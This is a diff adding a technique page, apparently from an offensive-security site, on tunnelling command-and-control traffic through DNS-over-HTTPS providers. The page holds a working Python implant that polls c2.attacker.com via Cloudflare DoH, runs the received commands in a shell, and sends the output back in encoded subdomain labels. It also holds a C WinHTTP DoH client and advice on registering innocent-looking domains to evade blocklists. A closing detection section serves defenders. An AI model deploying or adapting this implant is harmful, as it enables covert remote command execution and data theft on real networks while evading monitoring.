@@ -1,0 +1,265 @@
+---
+title: DNS-over-HTTPS C2
+mitre: T1071.004
+category: c2
+group: Covert Channels
+summary: Tunnel C2 traffic through DNS-over-HTTPS providers, encrypting DNS queries so network sensors cannot inspect subdomain labels.
+platform: [Windows, Linux, macOS]
+tags: ['Python', 'C / C++', 'HTTPS', 'DNS']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: select a DoH provider
+    desc: Hard-code Cloudflare (1.1.1.1), Google (8.8.8.8), or Quad9 DoH endpoints; or host a custom DoH server on a CDN.
+    dll: —
+  - call: encode payload in subdomain labels
+    desc: Base32-encode the C2 data as subdomain labels of an attacker-controlled domain (same encoding as DNS beaconing).
+    dll: —
+  - call: POST https://1.1.1.1/dns-query with application/dns-message content-type
+    desc: The DoH request is a standard HTTPS POST to the provider's endpoint with a DNS wire-format body.
+    dll: winhttp / libcurl
+  - call: DoH provider forwards the query to the attacker's authoritative NS
+    desc: The DoH resolver resolves the query over encrypted DNS; the attacker's NS receives it and returns data in the answer.
+    dll: —
+  - call: decode response record
+    desc: Extract C2 data from the TXT or A record in the DNS response body.
+    dll: —
+detections:
+  - src: NETWORK
+    text: HTTPS connections to known DoH provider IPs (1.1.1.1, 8.8.8.8, 9.9.9.9) from processes that are not browsers or system resolvers.
+  - src: NETWORK
+    text: High volume of HTTPS POSTs to /dns-query with Content-Type application/dns-message — DoH is distinguishable from regular HTTPS by its endpoint and content type.
+  - src: PROXY LOG
+    text: Endpoint bypassing the corporate DNS resolver entirely and making direct HTTPS connections to DoH endpoints.
+  - src: BEHAVIOURAL
+    text: Non-browser process that connects to Cloudflare, Google, or Quad9 DoH IPs with fixed interval traffic.
+related:
+  - mitre: T1071.004
+    title: DNS Beaconing
+    desc: Classic DNS beaconing — visible in DNS logs but simpler to implement.
+    href: /techniques/c2/dns-beaconing
+  - mitre: T1090.004
+    title: HTTPS Domain Fronting
+    desc: Combine DoH with domain fronting to hide even the DoH provider selection.
+    href: /techniques/c2/https-domain-fronting
+  - mitre: T1071.001
+    title: HTTP Beaconing
+    desc: HTTP/S based C2 as an alternative when DNS is filtered.
+    href: /techniques/c2/http-beaconing
+labKit:
+  - label: doh-c2.py
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+DNS-over-HTTPS (DoH) was designed to improve user privacy by encrypting DNS lookups — instead of sending a plaintext UDP query to the local resolver, the client sends an HTTPS POST to a DoH endpoint (e.g., `https://1.1.1.1/dns-query`). The DNS query travels inside TLS and is indistinguishable from regular HTTPS traffic to a passive network observer.
+
+This creates an evasion opportunity: traditional DNS beaconing is visible in corporate DNS logs and NGFW DNS inspection. DoH bypasses both — the corporate DNS resolver never sees the query, and the TLS encryption hides the subdomain labels from deep-packet inspection. The attacker's authoritative nameserver still receives the query, but the path from the implant to the resolver is opaque.
+
+The payload encoding is identical to standard DNS beaconing: data → base32 → subdomain labels of `c2.attacker.com` → query wrapped in DoH POST.
+
+<Callout type="note">
+  Most corporate environments route all outbound traffic through a proxy or firewall that
+  performs TLS inspection. In these environments, DoH to known provider IPs (1.1.1.1, 8.8.8.8)
+  will be decrypted at the proxy, and the Content-Type `application/dns-message` header will
+  expose the DoH traffic. Using a custom DoH server on an innocent-looking HTTPS domain is
+  more evasive in proxy-inspected environments.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### DoH query using Cloudflare (Python implant)
+
+<CodeBlock
+  file="doh_beacon.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`import base64, struct, requests, time, random, os
+
+C2_DOMAIN  = "c2.attacker.com"
+DOH_URL    = "https://1.1.1.1/dns-query"  # Cloudflare DoH
+CHUNK_SIZE = 30  # bytes per subdomain label after base32
+
+def b32_encode_chunk(data):
+    return base64.b32encode(data).decode().lower().rstrip('=')
+
+def build_dns_query(fqdn):
+    """Build a DNS wire-format TXT query for fqdn."""
+    # Transaction ID: 2 bytes random
+    txid = os.urandom(2)
+
+    # Flags: standard query, recursion desired
+    flags = b'\\x01\\x00'
+
+    # Counts: 1 question, 0 answers, 0 authority, 0 additional
+    counts = b'\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00'
+
+    # QNAME: length-prefixed labels
+    labels = b''
+    for label in fqdn.split('.'):
+        enc = label.encode()
+        labels += bytes([len(enc)]) + enc
+    labels += b'\\x00'  # root label
+
+    # QTYPE=TXT(16) QCLASS=IN(1)
+    qtype_class = b'\\x00\\x10\\x00\\x01'
+
+    return txid + flags + counts + labels + qtype_class
+
+def doh_send_chunk(seq, chunk_bytes):
+    """Send one chunk of data as a DoH DNS query."""
+    label = b32_encode_chunk(chunk_bytes)
+    fqdn  = f"{seq:04x}.{label}.{C2_DOMAIN}"
+
+    query = build_dns_query(fqdn)
+    b64q  = base64.b64encode(query).decode().rstrip('=')
+
+    # GET form (simpler; POST is more reliable for large queries)
+    resp = requests.get(DOH_URL,
+        params={"dns": b64q, "ct": "application/dns-json"},
+        headers={"Accept": "application/dns-json"},
+        timeout=10,
+        verify=True)
+    return resp.status_code == 200
+
+def doh_recv_task(beacon_id):
+    """Poll for a task via DoH TXT query."""
+    fqdn  = f"r.{beacon_id}.{C2_DOMAIN}"
+    query = build_dns_query(fqdn)
+    b64q  = base64.b64encode(query).decode().rstrip('=')
+
+    resp = requests.get(DOH_URL,
+        params={"dns": b64q, "ct": "application/dns-json"},
+        headers={"Accept": "application/dns-json"},
+        timeout=10)
+
+    if resp.status_code == 200:
+        data = resp.json()
+        for answer in data.get("Answer", []):
+            if answer.get("type") == 16:  # TXT
+                return base64.b64decode(answer["data"].strip('"'))
+    return None
+
+def beacon_loop():
+    beacon_id = os.urandom(4).hex()
+    while True:
+        task = doh_recv_task(beacon_id)
+        if task and task != b"NOP":
+            # Execute task and send result back
+            import subprocess
+            result = subprocess.run(task.decode(), shell=True,
+                capture_output=True, timeout=30).stdout
+            for i in range(0, len(result), CHUNK_SIZE):
+                doh_send_chunk(i // CHUNK_SIZE, result[i:i+CHUNK_SIZE])
+
+        # Jitter: sleep 30-90 seconds
+        time.sleep(30 + random.randint(0, 60))
+
+beacon_loop()`}
+/>
+
+### WinHTTP DoH client (C, Windows implant)
+
+<CodeBlock
+  file="doh_winhttp.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+#include \u003cwinhttp.h\u003e
+#pragma comment(lib, "winhttp.lib")
+
+// Send a DNS wire-format query to Cloudflare DoH via HTTPS POST
+// Returns the response body length, or 0 on failure
+DWORD doh_query(const BYTE *dns_wire, DWORD wire_len, BYTE *response, DWORD resp_max) {
+    HINTERNET session = WinHttpOpen(L"Mozilla/5.0",
+        WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
+
+    HINTERNET conn = WinHttpConnect(session, L"1.1.1.1",
+        INTERNET_DEFAULT_HTTPS_PORT, 0);
+
+    HINTERNET req = WinHttpOpenRequest(conn, L"POST", L"/dns-query",
+        NULL, WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE);
+
+    // Set Content-Type to application/dns-message
+    WinHttpAddRequestHeaders(req,
+        L"Content-Type: application/dns-message",
+        (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
+
+    WinHttpAddRequestHeaders(req,
+        L"Accept: application/dns-message",
+        (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
+
+    BOOL ok = WinHttpSendRequest(req, NULL, 0,
+        (PVOID)dns_wire, wire_len, wire_len, 0);
+    if (!ok) goto cleanup;
+
+    WinHttpReceiveResponse(req, NULL);
+
+    DWORD total = 0, read = 0;
+    while (WinHttpReadData(req, response + total,
+                           resp_max - total, &read) && read) {
+        total += read;
+    }
+
+    WinHttpCloseHandle(req);
+    WinHttpCloseHandle(conn);
+    WinHttpCloseHandle(session);
+    return total;
+
+cleanup:
+    WinHttpCloseHandle(req);
+    WinHttpCloseHandle(conn);
+    WinHttpCloseHandle(session);
+    return 0;
+}`}
+/>
+
+## DoH vs standard DNS beaconing comparison
+
+| Property | Standard DNS beaconing | DoH beaconing |
+|---|---|---|
+| Visible in DNS logs | Yes | No (bypasses corporate resolver) |
+| DPI/NGFW visible | Yes (plaintext UDP) | Only with TLS inspection |
+| Content-Type fingerprint | N/A | `application/dns-message` (detectable) |
+| Blocked by DNS sinkholes | Yes | No |
+| Latency overhead | Low | Higher (TLS handshake per request) |
+| Traffic volume | Low (UDP) | Higher (HTTPS overhead) |
+| Corporate proxy bypass | No | Depends on proxy config |
+
+## Custom DoH server (avoid known-bad IPs)
+
+Rather than using Cloudflare (1.1.1.1) or Google (8.8.8.8) as the DoH resolver — both of which are commonly monitored or blocked in corporate environments — host a custom DoH server:
+
+1. Register a legitimate-looking domain (e.g., `dns.corp-helper.com`)
+2. Deploy a DoH server (dnsdist, CoreDNS with DoH plugin, or a custom HTTPS server)
+3. Hard-code the custom DoH URL in the implant
+
+The traffic now goes to an unknown HTTPS host rather than a known DoH provider IP, defeating blocklists and reducing IoC matching.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The most practical detection is identifying endpoints that bypass the corporate DNS resolver entirely. In a managed environment, all DNS traffic should flow through the corporate resolver; direct HTTPS connections to port 443 on `1.1.1.1`, `8.8.8.8`, or `9.9.9.9` from non-browser processes are anomalous. Firewall rules blocking outbound 443 to these specific IPs force the implant to use the corporate DNS, where beaconing is visible.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
